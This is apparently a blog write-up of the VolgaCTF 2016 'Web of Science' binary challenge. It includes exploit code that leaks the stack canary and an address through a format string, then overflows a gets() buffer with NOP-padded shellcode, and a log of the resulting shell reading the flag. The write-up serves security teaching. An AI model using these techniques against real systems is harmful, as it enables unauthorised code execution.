---
layout: post
title: VolgaCTF 2016 - Web of Science
categories:
tags: exploit volgactf-2016 x86
author: hugsy
---


### Info ###

The vulnerable file is [here](http://s000.tinyupload.com/?file_id=13236613895475757799).

{% highlight bash %}
gef➤  !file ./web_of_science
./web_of_science: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=85e0df26435ee411258ad39668c9700b1ebadec9, stripped
gef➤  checksec
[+] checksec for '/home/hugsy/ctf/volgactf_2016/web_of_science'
Canary:                                           Yes
NX Support:                                       No
PIE Support:                                      No
RPATH:                                            No
RUNPATH:                                          No
Partial RelRO:                                    Yes
Full RelRO:                                       No
{% endhighlight %}

It's a simple dynamically linked binary for x86-64. We have a canary stack
however the stack is executable (the '90s says hello!), which `gef`
confirms instantly:
![exec-stack](https://i.imgur.com/LfT3dt1.png)


### Vulnerabilities ###

`web_of_science` is a tool to manage scientific papers.
The binary is full of vulnerabilities, many of which were automatically detected
by the `format-string-helper` command from [GDB-GEF](https://github.com/hugsy/gef.git)

![fmt-str-gef](https://i.imgur.com/cqYmZLi.png)

Without any static analysis, we immediately spot that many (if not all)
`printf()` calls are vulnerable to format string vulnerabilities, where we
control the format field. That's good, we can leverage that later to bypass the
canary protection. So far, so good ☺

<!--more-->

So what does the binary do? It starts by call the function at 0x04007CD which
checks if we are human by prompting us to solve an addition with randomly
generated integers. Pretty hardcore stuff, right?

Then we jump into serious business at 0x400E1C. The function offers a menu to
respectively add/delete/list/view papers and exit.

When adding a paper (`add_paper()` function), a stack buffer of 1096 bytes is
allocated on the stack. It is then possible to populate different fields of this
stack allocated paper as shown here:

![add-paper-fill-info](https://i.imgur.com/dTZmTgS.png)

When saving the stack buffer is then copied to the .bss segment:

{% highlight bash %}
.text:0000000000400BAD loc_400BAD:                             ; DATA XREF: .rodata:0000000000401240
.text:0000000000400BAD                 mov     eax, cs:nb_papers
.text:0000000000400BB3                 cdqe
.text:0000000000400BB5                 shl     rax, 6
.text:0000000000400BB9                 mov     rdx, rax
.text:0000000000400BBC                 shl     rdx, 4
.text:0000000000400BC0                 add     rax, rdx
.text:0000000000400BC3                 add     rax, offset base_papers
.text:0000000000400BC9                 mov     rdx, rax
.text:0000000000400BCC                 lea     rsi, [rbp+paper]
.text:0000000000400BD3                 mov     eax, 88h
.text:0000000000400BD8                 mov     rdi, rdx
.text:0000000000400BDB                 mov     rcx, rax
.text:0000000000400BDE                 rep movsq               ; memcpy(base_paper[i], paper_stack)
.text:0000000000400BE1                 mov     eax, cs:nb_papers
.text:0000000000400BE7                 add     eax, 1          ; increments the number of paper
.text:0000000000400BEA                 mov     cs:nb_papers, eax
.text:0000000000400BF0                 jmp     short loc_400BF9
{% endhighlight %}

One stricking thing is of course the massive use of `gets()` everywhere for user
input.

The `view_paper()` function (at 0x400D52) receives a pointer to a paper and
displays its information using `printf()` - which makes us understand what
triggered the `gef` plugin for format string.

![view-paper](https://i.imgur.com/f7hs6qZ.png)


### Exploitation ###

The exploitation process shows shows something like this:

   1. Use of the format string vulnerabilities to leak stack until we get the
      canary using `printf()`
   1. Overflow one of the stack allocated buffer using `gets()`, correctly
      insert the canary, and jump to our stack-based shellcode.

So this lines up the following sequential steps:

   - Create a paper to allocate a 1096 byte stack buffer
{% highlight python %}
    ok("Adding a paper")
    s.read_until("> ")
    s.write("1\n") # add_paper

    ok("Adding paper name")
    s.read_until("> ")
    s.write("1\n") # add_paper_name
    s.read_until("Paper name: ")
    s.write('A'*10+"\n")
{% endhighlight %}

   - Using the abstract field of the paper to store our format string to leak
    the canary, and the stack address (for returning to it).
{% highlight python %}
    ok("Adding paper abstract")
    s.read_until("> ")
    s.write("3\n") # add_paper_abstract
    s.read_until("Paper abstract: ")
    s.write("%7$p.%163$p" + "\n")
{% endhighlight %}
   A stack address was found at "$7$p" and the canary at "%163$p".

   - We need to view the paper to actually trigger the format string information
     leaks:
{% highlight python %}
    s.read_until("> ")
    s.write("5\n") # view_paper_info
    s.read_until("Abstract:\n\t")
    paper_addr, canary = s.read_until("\nTags:\n\t")[:-8].split('.', 1)
    paper_addr = int(paper_addr, 16)
    canary = int(canary, 16)
    ok("Got addr: %#x" % paper_addr)
    ok("Got canary: %#x" % canary)
{% endhighlight %}

   - And now, build our payload, overflow the buffer, insert the canary to get
   good karma, and make the `ret` at 0x400C0E fall back to our controlled
   buffer:
{% highlight python %}
    s.read_until("> ")
    s.write("1\n") # add_paper_name
    ok("Sending payload")
    payload = ""
    payload+= "\x90"*0x8
    payload+= SC
    payload+= "\x90"*(1096-len(payload))
    payload+= q_s(canary) + "JUNK"*2 + q_s(paper_addr)
    s.read_until("Paper name: ")
    s.write(payload + '\n')

    s.read_until("> ")
    s.write("6\n") # quit to trigger the ret
{% endhighlight %}

And the execution gives:
{% highlight bash %}
~/ctf/volgactf_2016 $  ./gef-exploit.py
[+] Connected to webofscience.2016.volgactf.ru:45678
[+] Passing checks
[+] Adding a paper
[+] Adding paper name
[+] Adding paper abstract
[+] Showing paper to leak the canary
[+] Got addr: 0x7fffffffe6e0
[+] Got canary: 0x675049f6baf95300
[+] Sending payload
[+] Got it, interacting (Ctrl-C to break)
[+] Get a PTY with ' python -c "import pty;pty.spawn('/bin/bash')"  '

python -c "import pty;pty.spawn('/bin/bash')"
nobody@scweb1:/opt$ ls
flag_wos.txt  install  start_wos  web_of_science
nobody@scweb1:/opt$ cat flag_wos.txt
VolgaCTF{executable_st@ck_doesnt_cause_@ny_problems_d0es_it}
{% endhighlight %}

All done mate !


### Conclusion ###

Final word (or image):

![](https://i.imgur.com/PjfFC2f.jpg)

Full exploit is : [gef-exploit.py](https://gist.github.com/hugsy/deae32e1da40e7b8c754)

A write-up for `web_of_science_2` might as well come soon, stay tuned...
